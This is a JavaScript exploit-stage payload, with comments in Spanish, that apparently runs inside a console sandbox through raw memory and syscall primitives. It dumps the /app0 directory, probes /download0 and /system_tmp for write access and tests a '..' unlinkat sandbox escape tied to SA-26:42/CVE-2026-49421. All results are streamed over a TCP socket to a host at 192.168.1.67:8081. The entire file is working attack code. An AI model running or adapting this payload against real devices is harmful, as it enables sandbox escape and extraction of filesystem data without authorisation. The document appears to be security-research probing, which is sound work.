// fs_probe2_1320: CONTINUACION FS probe. Testea /download0,/system_tmp (sin testear) + DUMP COMPLETO /app0. Canal TCP W() 192.168.1.67:8081 (0x911F/0x4301A8C0).
// ABI (=fs_probe): getdirentries=196 unlinkat=503 (no 500/501) mkdir136 rmdir137 unlink10 openat499. O_CW=0x201(CREAT|WRONLY) CWT=0x601. AT_RESOLVE_BENEATH=0x2000 sondeado: EINVAL=no existe (11.0 pura, SA-26:42 NO APLICA); ok=kernel 13.x+. ENOTCAPABLE93.
// /app0 previo con buf64B solo daba "."/".." + 2 nombres cortados -> aqui buf 0x2000 hexdump 32B/linea. filenos ff..ff(=-1)=whiteout UFS: nombre queda, fichero no valido.
// Solo creamos <dir>/fuzz_probe (+esc.out padre en 4d); borramos todo en 4e. Nunca tocar dirs existentes. W antes de syscall. Sin mmap/thr_new/rfork.
(()=>{
const I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const Y=331n,S_RD=3n,S_WR=4n,S_OP=5n,S_CL=6n,S_UNL=10n,S_MK=136n,S_RM=137n,S_GDE=196n,S_OAT=499n,S_UAT=503n,O_CW=0x201n,O_CWT=0x601n,ARB=0x2000n;
const EL={1:"EPERM",2:"ENOENT",13:"EACCES",17:"EEXIST",22:"EINVAL",30:"EROFS",78:"ENOSYS",93:"ENOTCAPABLE"};
const ELM=(e)=>EL[e]!==undefined?EL[e]:"?";
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const L=(s)=>W("[fsp2] "+s);
const E=(n,s)=>L("PASO "+n+": "+s);
const N=(s)=>{try{send_notification(s)}catch(e){}};
const EN=()=>{try{const m=/^(\d+)/.exec(get_error_string());return m?parseInt(m[1],10):-1}catch(e){return -1}};
const J=(e)=>" errno="+e+"("+ELM(e)+")";
const PS=(b,s)=>{let n=0;for(;n<s.length&&n<63;n++)write8(b+BigInt(n),s.charCodeAt(n)&255);write8(b+BigInt(n),0);return b};
const P1=malloc(64),P2=malloc(64),P3=malloc(64),P4=malloc(64),BP=malloc(8),RB=malloc(32),AB=malloc(32),GBUF=malloc(0x2000);
for(let i=0;i<16;i++)write8(AB+BigInt(i),0x41);
const HEX=(b,n)=>{let x="";for(let i=0;i<n;i++){const v=Number(read8(b+BigInt(i)))&255;x+=(v<16?"0":"")+v.toString(16)+" "}return x};
const STR=(b,n)=>{let x="";for(let i=0;i<n;i++){const v=Number(read8(b+BigInt(i)))&255;if(v>=32&&v<127)x+=String.fromCharCode(v)}return x};
const HX=(v)=>{let s=(Number(v)>>>0).toString(16);while(s.length<4)s="0"+s;return s};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);const cr=I(syscall(SYSCALL.connect,sock,sa,16n));if(cr<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
// P1 getdirentries /app0 (0x2000, 32B/linea)
E(1,"getdirentries /app0 0x2000");
let app0R=-1,app0Str="";
const AFD=I(syscall(S_OP,PS(P1,"/app0"),0n));
if(AFD<0n)L("P1 open /app0"+J(EN()));
else{write64(BP,0n);
  L("P1 getdirentries /app0 0x2000");
  const r=I(syscall(S_GDE,AFD,GBUF,0x2000n,BP));
  if(r<0n)L("P1 getdirentries"+J(EN()));
  else if(r===0n)L("P1 /app0 dir vacia");
  else{app0R=Number(r);if(app0R<0)app0R=0;if(app0R>0x2000)app0R=0x2000;
    L("P1 TOTAL "+r+"B (ff..ff=whiteout)");
    for(let off=0;off<app0R;off+=32){let ln=app0R-off;if(ln>32)ln=32;
      L("P1 +0x"+HX(off)+": "+HEX(GBUF+BigInt(off),ln)+"|"+STR(GBUF+BigInt(off),ln)+"|");}
    let ns=app0R;if(ns>256)ns=256;app0Str=STR(GBUF,ns);
    L("P1 fin "+app0R+"B print:'"+app0Str+"'");}
  syscall(S_CL,AFD);}
if(app0R<0)L("P1 sin dump /app0");
// WP lifecycle escritura (true=escribible)
const WP=(u,d)=>{PS(P1,d+"/fuzz_probe");
  L("P"+u+" mkdir "+d);
  const m=I(syscall(S_MK,P1,0x1ffn));
  if(m<0n){const e=EN();L("P"+u+" mkdir"+J(e));if(e!==17){L("P"+u+" RO -> sig");return false;}L("P"+u+" EEXIST reuso");}
  else L("P"+u+" mkdir ok");
  PS(P2,d+"/fuzz_probe/test.txt");L("P"+u+" open 0x201");
  const f1=I(syscall(S_OP,P2,O_CW,0x1ffn));
  if(f1<0n){L("P"+u+" open"+J(EN())+" -> RO");return false;}
  const wn=I(syscall(S_WR,f1,AB,16n));L("P"+u+" write16 -> "+wn);syscall(S_CL,f1);
  L("P"+u+" reopen");const f2=I(syscall(S_OP,P2,0n));
  if(f2<0n)L("P"+u+" reopen"+J(EN()));
  else{const rn=I(syscall(S_RD,f2,RB,32n));let m2=rn<0n?0:Number(rn);if(m2>32)m2=32;L("P"+u+" read n="+rn+" '"+STR(RB,m2)+"'");syscall(S_CL,f2);}
  L("P"+u+" WRITE OK "+d);return true;};
E(2,"probe escritura /download0");const ok2=WP(2,"/download0");
E(3,"probe escritura /system_tmp");const ok3=WP(3,"/system_tmp");
const wd=ok2?"/download0":(ok3?"/system_tmp":null);
const wlist=([ok2?"/download0":null,ok3?"/system_tmp":null].filter(x=>x).join(" "))||"ninguno";
// P4 BENEATH (SA-26:42) primer dir escribible
let dirfd=-1n,flagOK=false,e4b=-1,escBroke=false,cRan=false;
if(wd!==null){
  E(4,"AT_RESOLVE_BENEATH 0x2000 (SA-26:42) "+wd);
  PS(P1,wd+"/fuzz_probe");L("P4 open dirfd");
  dirfd=I(syscall(S_OP,P1,0n));
  if(dirfd<0n)L("P4 dirfd"+J(EN())+" -> SKIPPED");
  else{
    PS(P2,"test.txt");L("P4b unlinkat test.txt flag=0");
    const ra=I(syscall(S_UAT,dirfd,P2,0n));
    if(ra>=0n)L("P4b ok borrado");
    else{const e=EN();L("P4b"+J(e)+(e===78?" unlinkat ENOSYS":""));}
    L("P4c recrea test CWT");
    const fb=I(syscall(S_OAT,dirfd,P2,O_CWT,0x1ffn));
    if(fb<0n)L("P4c openat"+J(EN())+" -> SKIPPED");
    else{syscall(S_WR,fb,AB,4n);syscall(S_CL,fb);
      L("P4c unlinkat test.txt flag=0x2000");
      const rb=I(syscall(S_UAT,dirfd,P2,ARB));
      if(rb>=0n){flagOK=true;L("P4c 0x2000 VALIDADO flag EXISTE (kernel 13.x+)");}
      else{e4b=EN();
        if(e4b===22)L("P4c EINVAL flag NO existe SA-26:42 NO APLICA (CERRADO)");
        else L("P4c"+J(e4b)+" DOC"+(e4b===2?" (anomalo existia)":""));}
      if(flagOK){PS(P3,"test2.txt");
        const f2c=I(syscall(S_OAT,dirfd,P3,O_CWT,0x1ffn));let canC=f2c>=0n;
        if(canC){syscall(S_WR,f2c,AB,4n);syscall(S_CL,f2c);}
        else L("P4d mk test2"+J(EN())+" -> SKIPPED");
        if(canC){PS(P4,wd+"/esc.out");
          const fe=I(syscall(S_OP,P4,O_CWT,0x1ffn));
          if(fe>=0n){syscall(S_WR,fe,AB,4n);syscall(S_CL,fe);L("P4d crea esc.out ok");}
          else L("P4d esc.out"+J(EN())+" padre RO");
          PS(P3,"../fuzz_probe/test2.txt");cRan=true;
          L("P4d unlinkat ../test2.txt flag=0x2000");
          const rd4=I(syscall(S_UAT,dirfd,P3,ARB));
          if(rd4>=0n){escBroke=true;
            L("P4d !! CONTENCION ROTA: borro via '..' con flag -> SA-26:42/CVE-2026-49421 VIVO");
            N("[fsp2] SA-26:42 VIVO: contencion rota");}
          else{const e=EN();
            if(e===2)L("P4d ENOENT '..' BLOQUEADO PARCHADA (CERRADO)");
            else L("P4d"+J(e)+" DOC (esp ENOENT2/ENOTCAPABLE93)");}
        }}}
  }
  // 4e limpieza
  L("P4e limpieza "+wd);
  if(dirfd>=0n)syscall(S_CL,dirfd);
  PS(P4,wd+"/esc.out");const ce=I(syscall(S_UNL,P4));L("P4e rm esc.out "+(ce>=0n?"ok":EN()));
  PS(P2,wd+"/fuzz_probe/test2.txt");const c2=I(syscall(S_UNL,P2));L("P4e rm test2 "+(c2>=0n?"ok":EN()));
  PS(P1,wd+"/fuzz_probe/test.txt");const c1=I(syscall(S_UNL,P1));L("P4e rm test "+(c1>=0n?"ok":EN()));
  PS(P1,wd+"/fuzz_probe");L("P4e rmdir");const rr=I(syscall(S_RM,P1));
  L("P4e rmdir "+(rr>=0n?"ok eliminado":EN()));
}
// si ambos escribibles: limpiar system_tmp (no elegido por P4)
if(ok2&&ok3){PS(P3,"/system_tmp/fuzz_probe/test.txt");syscall(S_UNL,P3);PS(P3,"/system_tmp/fuzz_probe");syscall(S_RM,P3);L("P3 dir no elegido limpiado");}
// P5 resumen+veredicto
E(5,"resumen");
let fv;
if(wd===null)fv="n/a sin dir escribible";
else if(dirfd<0n)fv="incompleto (sin dirfd)";
else if(escBroke)fv="EXISTE y ROTO: '..' no bloqueado -> SA-26:42 VIVO";
else if(flagOK&&cRan)fv="existe, '..' bloqueado PARCHADA (CERRADO)";
else if(flagOK)fv="existe, contencion no ejecuto";
else if(e4b===22)fv="NO existe (EINVAL 11.0 pura) -> SA-26:42 NO APLICA (CERRADO)";
else fv="sondeo"+J(e4b);
L("RES app0 "+(app0R>=0?(app0R+"B print:'"+app0Str+"'"):"sin dump"));
L("RES escribibles: "+wlist);
L("RES BENEATH(0x2000):"+fv);
const RO="FS 100% read-only desde sandbox (3 dirs probados x2 runs)";
const verdict=(wd===null)?RO:("FS write:"+wd+"|BENEATH "+fv);
if(wd===null)L(RO);
N("[fsp2] "+verdict.slice(0,90));
for(let i=0;i<10;i++){N("[fsp2] "+verdict.slice(0,90));for(let j=0;j<3000;j++)syscall(Y);}
L("PAYLOAD DONE");
try{if(sock>=0n)syscall(SYSCALL.close,sock);}catch(e){}
})();
